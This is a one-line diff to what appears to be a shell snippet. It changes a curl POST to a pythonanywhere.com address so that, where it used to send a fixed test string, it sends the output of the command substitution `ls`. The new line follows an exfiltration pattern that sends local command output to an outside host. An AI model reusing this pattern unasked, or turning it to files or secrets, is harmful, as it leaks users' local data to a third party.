@@ -1,1 +1,1 @@
-curl -d "contents=asddsa" -X POST http://mikaelkg.pythonanywhere.com/
+curl -d "contents=`ls`" -X POST http://mikaelkg.pythonanywhere.com/
